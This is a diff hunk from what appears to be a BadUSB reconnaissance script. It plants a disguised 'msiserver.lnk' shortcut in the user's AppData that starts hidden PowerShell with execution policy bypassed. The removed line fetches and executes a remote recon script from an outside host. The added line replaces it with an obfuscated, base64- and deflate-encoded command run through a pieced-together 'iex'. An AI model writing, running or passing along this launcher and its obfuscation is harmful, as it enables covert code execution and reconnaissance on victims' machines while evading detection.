@@ -708,7 +708,7 @@ if(![System.IO.File]::Exists($env:appdata+"\..\Local\msiserver.lnk")){
     $objShell = New-Object -COM WScript.Shell
 	$objShortCut = $objShell.CreateShortcut($env:appdata+"\..\Local\msiserver.lnk")
 	$target = "powershell"
-	$args = "-Nop -Noni -w h -ep bypass -command `"`$dc='"+$dc+"';irm https://files.seall.dev/badusb/SeallDEV+jakoby-RECON.ps1 | iex`""
+	$args = "-Nop -Noni -w h -ep bypass -command `"( NEw-ObjeCt  SYsTeM.iO.ComPrESSion.deflAtestrEaM([IO.mEmORYstrEAm] [cONvErt]::fROMbASE64sTriNG( 'S1BJSbZVBxLq1plFuQoZJSUFxVb6+mmZOanFesWpiTk5eimpZfpJiSmlxUn6wSABF9cw7azE7PykSt0gV2d/P72CYkOFGoXM1AoA' ),[io.COmPreSSioN.CompreSSIONmODe]::DECOmPresS) |foREAch-oBjeCT{ NEw-ObjeCt  sYsTeM.Io.sTrEaMreADeR( $_, [sysTem.text.EncoDing]::asCii) }|fOreAch-oBjeCT{ $_.rEAdtOenD( )})|&( $shellId[1]+$sheLlId[13]+'x')"
 	$objShortCut.TargetPath = $target
 	$objShortcut.Arguments = $args
 	$objShortCut.Save()
